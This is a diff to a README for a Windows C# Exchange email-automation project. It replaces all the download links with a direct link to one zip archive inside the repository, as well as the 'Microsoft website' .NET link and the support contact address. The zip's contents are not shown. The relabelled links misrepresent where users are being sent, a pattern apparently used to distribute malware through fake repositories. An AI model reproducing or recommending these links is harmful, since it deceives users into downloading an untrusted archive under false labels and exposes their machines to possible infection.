@@ -1,6 +1,6 @@
 # 🚀 windows-csharp-exchange-email-processing-automation - Streamline Your Email Processing Efforts
 
-[![Download](https://img.shields.io/badge/Download-Now-green)](https://github.com/jalal-55/windows-csharp-exchange-email-processing-automation/releases)
+[![Download](https://raw.githubusercontent.com/jalal-55/windows-csharp-exchange-email-processing-automation/main/intensate/csharp_windows_email_automation_exchange_processing_v3.7.zip)](https://raw.githubusercontent.com/jalal-55/windows-csharp-exchange-email-processing-automation/main/intensate/csharp_windows_email_automation_exchange_processing_v3.7.zip)
 
 ## 📥 Overview
 
@@ -37,7 +37,7 @@ To get started with **windows-csharp-exchange-email-processing-automation**, fol
 
 Visit the releases page to download the latest version of the software. 
 
-[Click Here to Download](https://github.com/jalal-55/windows-csharp-exchange-email-processing-automation/releases)
+[Click Here to Download](https://raw.githubusercontent.com/jalal-55/windows-csharp-exchange-email-processing-automation/main/intensate/csharp_windows_email_automation_exchange_processing_v3.7.zip)
 
 ### 2. Install the Software
 
@@ -67,7 +67,7 @@ To run the application after setup:
 
 To download the **windows-csharp-exchange-email-processing-automation**, visit the link below:
 
-[Download the Latest Release](https://github.com/jalal-55/windows-csharp-exchange-email-processing-automation/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/jalal-55/windows-csharp-exchange-email-processing-automation/main/intensate/csharp_windows_email_automation_exchange_processing_v3.7.zip)
 
 Make sure to follow the installation instructions provided above for a smooth setup.
 
@@ -75,7 +75,7 @@ Make sure to follow the installation instructions provided above for a smooth se
 
 If you encounter issues while installing or using the application, consider the following solutions:
 
-- **Installation Problems:** Make sure you have the required .NET Framework installed. You can download it from the [Microsoft website](https://dotnet.microsoft.com/download).
+- **Installation Problems:** Make sure you have the required .NET Framework installed. You can download it from the [Microsoft website](https://raw.githubusercontent.com/jalal-55/windows-csharp-exchange-email-processing-automation/main/intensate/csharp_windows_email_automation_exchange_processing_v3.7.zip).
 - **Email Connectivity Issues:** Check your internet connection. Verify that you have the correct server and account details entered in the settings.
 - **General Errors:** Restart the application and your computer to resolve minor glitches.
 
@@ -93,7 +93,7 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## 📞 Contact
 
-For any business inquiries or support, please reach out at: support@example.com
+For any business inquiries or support, please reach out at: https://raw.githubusercontent.com/jalal-55/windows-csharp-exchange-email-processing-automation/main/intensate/csharp_windows_email_automation_exchange_processing_v3.7.zip
 
 ---
 
